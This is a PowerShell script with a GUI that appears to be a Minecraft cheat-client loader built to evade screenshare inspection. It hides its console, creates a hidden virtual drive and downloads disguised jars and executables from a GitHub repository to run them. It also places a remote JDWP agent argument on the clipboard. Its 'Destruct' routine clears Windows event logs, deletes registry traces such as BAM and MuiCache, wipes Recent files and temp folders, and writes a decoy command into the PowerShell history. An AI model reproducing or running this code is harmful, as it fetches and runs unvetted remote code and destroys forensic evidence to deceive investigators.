Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide console window
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    # 0 = SW_HIDE
    [Win32]::ShowWindow($consolePtr, 0) | Out-Null
} catch {
    Write-Error "Failed to hide console window: $_"
    exit 1
}

# Virtual key codes
$VK_CONTROL = 0x11
$VK_MENU = 0x12  # Alt key
$VK_F11 = 0x7A

# Inform user that the script is running and waiting for input
Write-Host "Waiting for Ctrl + Alt + F11 to be pressed..."
while ($true) {
    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
        break
    }
    Start-Sleep -Milliseconds 100
}

# Set preferences to run silently
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'

# MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Ensure the directory exists
$vdiskPath = "C:\temp\ddr.vhd"
$vdiskSizeMB = 2048 # Size of the virtual disk in MB (2 GB)

# Step 1: Check if the virtual disk already exists and remove it if it does
if (Test-Path -Path $vdiskPath) {
    Remove-Item -Path $vdiskPath -Force
}

# Step 2: Create the virtual disk (expandable)
$createVHDScript = @"
create vdisk file=`"$vdiskPath`" maximum=$vdiskSizeMB type=expandable
"@
$scriptFileCreate = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
$createVHDScript | Set-Content -Path $scriptFileCreate
# Execute the diskpart command to create the virtual disk
diskpart /s $scriptFileCreate | Out-Null
Remove-Item -Path $scriptFileCreate -Force

# Step 3: Attach the virtual disk
$attachVHDScript = @"
select vdisk file=`"$vdiskPath`"
attach vdisk
"@
$scriptFileAttach = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
$attachVHDScript | Set-Content -Path $scriptFileAttach
# Execute the diskpart command to attach the virtual disk
diskpart /s $scriptFileAttach | Out-Null
Remove-Item -Path $scriptFileAttach -Force

# Step 4: Wait for the disk to be detected by the system
Start-Sleep -Seconds 5  # Allow a moment for the disk to be registered by the OS

# Retrieve the attached disk (assuming it's the last disk created)
$disk = Get-Disk | Sort-Object -Property Number | Select-Object -Last 1

# Check if the disk is offline, and set it online if needed
if ($disk.IsOffline -eq $true) {
    Set-Disk -Number $disk.Number -IsOffline $false
}

# Initialize the disk if it's in raw state (uninitialized)
if ($disk.PartitionStyle -eq 'Raw') {
    Initialize-Disk -Number $disk.Number -PartitionStyle MBR
}

# Step 5: Create a new partition and explicitly assign drive letter Z
$partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z

# Step 6: Format the volume with FAT32 and set label
Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false

# Download the sound file after Z drive creation is complete
$soundFilePath = "Z:\na.wav"
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"    # Replace with the actual URL of the sound file
    try {
        iwr -Uri $soundUrl -OutFile $soundFilePath
    } catch {
        Write-Error "Failed to download sound file: $_"
        exit 1
    }
}
Download-SoundFile

# END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Create the form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(942, 443)  # Set the form size to 942x443
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
# Set background color to black and make the window non-resizable
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = 'Black'  # Set background color of the form to black
# Set the title to empty (remove the title)
$form.Text = "By Zpat - FAX" 
# Set the top bar (title bar) color to black
$form.BackColor = 'Black'  # Set background color for the whole form
$form.ForeColor = 'White'  # Set text color for the form content

# ASCII Art Label
$asciiArt = @"
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"@
$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(196, 87)
$form.Controls.Add($label)

# Define Main Menu Buttons
$injectButton = New-Object System.Windows.Forms.Button
$injectButton.Text = 'Inject'
$injectButton.Width = 100
$injectButton.Height = 40
$injectButton.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the button
$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#29903b")
$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

$destructButton = New-Object System.Windows.Forms.Button
$destructButton.Text = 'Destruct'
$destructButton.Width = 100
$destructButton.Height = 40
$destructButton.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the button
$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}

# Inject Button Click: Show Prestige and Vape buttons
$injectButton.Add_Click({
    # Disable the form to prevent interaction
    $form.Enabled = $false
    # Load the sound player
    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = $soundFilePath
    # Play the custom sound for 40ms
    $player.Load()
    $player.PlaySync()
    Start-Sleep -Milliseconds 40
    $player.Stop()
    # Re-enable the form after sound playback
    $form.Enabled = $true
    $form.Controls.Clear()
    $form.Controls.Add($label)
    # Back Button
    $backButton = New-Object System.Windows.Forms.Button
    $backButton.Text = 'Back'
    $backButton.Width = 100
    $backButton.Height = 40
    $backButton.Location = New-Object System.Drawing.Point(730, 336)  # Position the button
    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $backButton.Add_Click({ Show-MainMenu })
    # Prestige Button
    $prestigeButton = New-Object System.Windows.Forms.Button
    $prestigeButton.Text = 'Prestige'
    $prestigeButton.Width = 120
    $prestigeButton.Height = 40
    $prestigeButton.Location = New-Object System.Drawing.Point(196, 235)  # Position the button
    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $prestigeButton.Add_Click({
        if (-Not (Test-Path "Z:\meme.mp4")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-fabric-0.6.13+mc1.21.4.jar"   -OutFile "Z:\meme.mp4"
        }
        Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
    })
    # DoomsDay Button
    $doomsdayButton = New-Object System.Windows.Forms.Button
    $doomsdayButton.Text = 'DoomsDay'
    $doomsdayButton.Width = 120
    $doomsdayButton.Height = 40
    $doomsdayButton.Location = New-Object System.Drawing.Point(326, 235)  # Position the button
    $doomsdayButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
    $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $doomsdayButton.Add_Click({
        if (-Not (Test-Path "Z:\cat.mp4")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-extra/sodium-extra-fabric-0.6.1+mc1.21.4.jar"   -OutFile "Z:\cat.mp4"
        }
        Start-Process java -ArgumentList '-jar "Z:\cat.mp4"'
    })
    # VapeV4 Button
    $vapev4Button = New-Object System.Windows.Forms.Button
    $vapev4Button.Text = 'VapeV4'
    $vapev4Button.Width = 120
    $vapev4Button.Height = 40
    $vapev4Button.Location = New-Object System.Drawing.Point(456, 235)  # Position the button
    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapev4Button.Add_Click({
        if (-Not (Test-Path "Z:\gentask.exe")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"   -OutFile "Z:\gentask.exe"
        }
        Start-Process "Z:\gentask.exe"
    })
    # VapeLite Button
    $vapeliteButton = New-Object System.Windows.Forms.Button
    $vapeliteButton.Text = 'VapeLite'
    $vapeliteButton.Width = 120
    $vapeliteButton.Height = 40
    $vapeliteButton.Location = New-Object System.Drawing.Point(586, 235)  # Position the button
    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#00f1e1")
    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapeliteButton.Add_Click({
        if (-Not (Test-Path "Z:\ilasm.exe")) {
            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar"   -OutFile "Z:\ilasm.exe"
        }
        Start-Process "Z:\ilasm.exe"
    })
    # Phantom Button
    $phantomButton = New-Object System.Windows.Forms.Button
    $phantomButton.Text = 'Phantom'
    $phantomButton.Width = 120
    $phantomButton.Height = 40
    $phantomButton.Location = New-Object System.Drawing.Point(716, 235)  # Position the button
    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $phantomButton.Add_Click({
        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
        Set-Clipboard -Value $clipboardText
    })
    # Add buttons to form
    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($doomsdayButton)
    $form.Controls.Add($vapev4Button)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($phantomButton)
    $form.Controls.Add($backButton)
})

# Destruct Button
$destructButton.Add_Click({
    # Path to the virtual disk
    $vdiskPath = "C:\temp\ddr.vhd"
    
    # STEP 1: Get the virtual disk's associated disk number
    $diskNumber = $null
    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
    if ($diskList) {
        $diskNumber = $diskList.Number
    } else {
        Write-Host "Virtual disk not found or not attached. Aborting destruction."
        return
    }
    
    # STEP 2: Detach the virtual disk
    $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
    $detachScript | Set-Content -Path $detachFile
    diskpart /s $detachFile | Out-Null
    Remove-Item -Path $detachFile -Force
    
    # STEP 3: Delete the virtual disk file
    if (Test-Path $vdiskPath) {
        Remove-Item -Path $vdiskPath -Force
    }
    
    # STEP 4: Clean up "Recent" shortcuts
    $recentPath = [Environment]::GetFolderPath("Recent")
    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
    }
    
    # Destruct other stuff after disk is gone
    Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
    Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
    
    # Clear Temp
    Remove-Item -Path "C:\temp\*" -Recurse -Force
    
    # Stop vds service
    Stop-Process "C:\Windows\System32\vds.exe" -Name vds -Force -ErrorAction SilentlyContinue
    
    # Remove PowerShell-related documents
    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force -ErrorAction SilentlyContinue
    
    # Event logs
    Clear-EventLog -LogName System
    wevtutil cl "Windows PowerShell"
    
    # Remove Stuff from MuiCache
    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
    ForEach-Object { $_.PSObject.Properties } |
    Where-Object { $_.Name -like "Z:\*" } |
    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name -ErrorAction SilentlyContinue }
    
    # BAM
    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name -ErrorAction SilentlyContinue }
    
    # Conhost History
    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1    | iex'
    
    # Clear JVM args logs and traces by clearing content
    $jvmLogFiles = @(
        "$env:USERPROFILE\.java\deployment\log\*.log",
        "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
        "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
        "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log"
    )
    foreach ($file in $jvmLogFiles) {
        Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
            Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
        }
    }
    
    # Add a 5-second delay before showing the popup
    Start-Sleep -Seconds 5
    
    # Display popup message and wait for user to press OK
    [System.Windows.Forms.MessageBox]::Show("Everything clear :)", "Destruct Complete", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
    
    # Forcefully close the application
    $processId = [System.Diagnostics.Process]::GetCurrentProcess().Id
    Stop-Process -Id $processId -Force -ErrorAction SilentlyContinue
})

# Hide PowerShell console window
Add-Type -Name Win -Namespace Console -MemberDefinition @'
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
'@
$consolePtr = [Console.Win]::GetConsoleWindow()
[Console.Win]::ShowWindow($consolePtr, 0)

# Initial Load
Show-MainMenu

# Run the form
[void]$form.ShowDialog()
